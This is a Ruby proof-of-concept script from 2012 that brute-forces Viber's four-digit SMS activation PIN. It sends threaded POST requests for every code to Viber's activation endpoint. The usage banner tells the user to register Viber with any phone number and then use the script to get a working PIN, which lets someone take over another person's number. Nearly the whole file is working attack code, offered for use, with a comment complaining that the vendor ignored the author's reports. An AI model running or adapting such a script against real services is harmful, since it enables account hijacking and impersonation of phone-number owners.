#!/usr/bin/env ruby
#
# viber-pin-bf.rb - Viber autentication bruteforce
#
# This little pice of software will bruteforce the Viber "PIN" key. Viber is a Skype-like 
# software that claims to have 100 million worldwide users.
#
# Instead of having Viber usernames you use your own mobile phone number as username. 
# When signing up for Viber you confirm that you own the mobile phone number by entering
# a four digit PIN code that you get by SMS in the registation process.
# 
# Four digit, no bruteforce protection, API-axss - A winning concept. \o/ Or well, they 
# have "some kind" of brute force "protection". After something like ten tries they 
# increment the PIN-code by 1. :)
# 
# I've tried to inform them about this. But they ignore my tweets and mails. They ignoring
# me results in me ignoring them.
#
# STICK TO THE INSTRUCTIONS OR IT WONT WORK. --help 
#
# ----
# myBox:viber-auth-bf tim$ ./viber-auth-bf.rb -u 128bcab992159630bd9a1c00f1e75b44cef40a90
# [+] Figuring out PIN for 128bcab992159630bd9a1c00f1e75b44cef40a90. This could take a while.
# [+] Success: found PIN: 9477
# ----
#
# PoC by Tim Jansson <tim@timtux.net>. Workin as of 2012-10-08.
#
require 'trollop'
require 'net/http'
require 'uri'

########################################################################################
# Commandos. Using Trollop Gem.
########################################################################################
ARGV[1] = '--help' if ARGV.empty?

opts = Trollop::options do
  version "Viber PIN Bruteforce 0.1 (c) 2012 Tim Jansson <tim@timtux.net>"

  banner "Viber PIN Bruteforce 0.1 (c) 2012 Tim Jansson <tim@timtux.net>\n "

  banner "--- READ CAREFULLY ---"
  banner "1: Install Viber on iPhone."
  banner "2: Register new account, enter any telephone number."
  banner "3: When asked for PIN-code. Go back one step."
  banner "4: To get the PIN to activate the account run this program"
  banner "   with your iPhone UDID as -u agrument."
  banner "5: Click [Continue] on the phone, [OK] and enter PIN received by #{__FILE__}."
  banner "6: Profit?!?!"
  banner " "
  banner "--- IMPORTANT! ---"
  banner "THE PIN CODE SENT WON'T BE THE SAME AS RECEIVED BY VIBER."
  banner "BUT WILL WORK AS LONG AS YOU STICK TO THE INSTRUCTIONS :)\n "

  banner "Usage  : #{__FILE__} --iphone-udid {UDID}"
  banner "Example: #{__FILE__} --iphone-udid 128bcab992159630bd9a1c00f1e75b44cef40a90"
  
  opt :iphone_udid, "Your iPhone UDID ", :short => "-u",
      :reuired => true, :type => String
end

########################################################################################
# LETS HAVE SOME FUN THIS BEAT IS SICK.
########################################################################################
puts "[+] Figuring out PIN for #{opts[:iphone_udid]}. This could take a while."

# Ten threads.
9.downto(0) do |i|
  t = Thread.new do
    "#{i}999".to_i.downto("#{i}000".to_i) do |j|
      # Zeh pin code has leading zeroes < 1000
      pin   = "%04d" % j

      # Post KEY => VAL
      value = "<ActivateUserRequest><UDID>#{opts[:iphone_udid]}</UDID><ActivationCode>#{pin}</ActivationCode><ProtocolVersion>10</ProtocolVersion></ActivateUserRequest>" 

      # GO GO GO
      url = "http://wa.viber.com/viber/viber.php?function=ActivateUser"
      uri = URI.parse(url)
      req = Net::HTTP::Post.new(url)
      req.set_form_data({"XMLDOC" => value})
      res = Net::HTTP.new(uri.host, uri.port).start { |http| http.request(req) }

      if /.*DeviceKey.*/.match res.body
        puts "[+] Success: found PIN: #{pin}"
        exit
      end
    end
  end
  
  t.join  # join to main thread
end

puts "[-] Could not find PIN. Should not happen! Wait a hour and try again."